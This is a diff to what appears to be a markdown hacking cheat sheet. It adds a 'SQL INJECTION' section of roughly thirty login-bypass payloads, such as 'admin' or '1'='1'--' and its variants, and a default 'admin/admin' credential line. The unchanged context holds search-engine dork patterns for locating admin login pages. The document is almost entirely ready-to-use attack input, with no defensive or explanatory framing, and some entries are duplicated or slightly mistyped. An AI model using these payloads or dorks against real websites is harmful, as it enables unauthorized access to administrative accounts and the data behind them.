@@ -21,11 +21,39 @@ Two
 - inurl:admin/index.php
 - inurl:adminlogin.aspx
 
-  - 1'or'1'='1
-  - 1'or'1'-'1
-  - OR 1-1 LIMIT 1 ;# or 1-1 limit 1 --
-  - admin' or '1'-'1
-  - 'or 1-1 limit 1--
 
+## SQL INJECTION
+- 1'or'1'='1
+- 1'or'1'-'1
+- OR 1-1 LIMIT 1 ;# or 1-1 limit 1 --
+- admin' or '1'-'1
+- 'or 1-1 limit 1--
+- 1'or'1'='1
+- ' or 1=1#
+- or 1=1
+- " or ""="
+- or 1=1--
+- or 1=1#
+- or 1=1/*
+- admin' --
+- admin' #
+- admin'/*
+- admin' or '1'='1
+- admin' or '1'='1'--
+- admin' or '1'='1'#
+- admin' or '1'='1'/*
+- admin'or 1=1 or ''='
+- admin' or 1=1
+- admin' or 1=1--
+- admin' or 1=1#
+- admin' or 1=1/*
+- admin') or ('1'='1
+- admin') or ('1'='1'--
+- admin') or ('1'='1'#
+- admin') or ('1'='1'/*
+- admin') or '1'='1
+- admin') or '1'='1'--
+- admin') or '1'='1'#
+- admin') or '1'='1'/*
 
-
+- user Name: admin password: admin
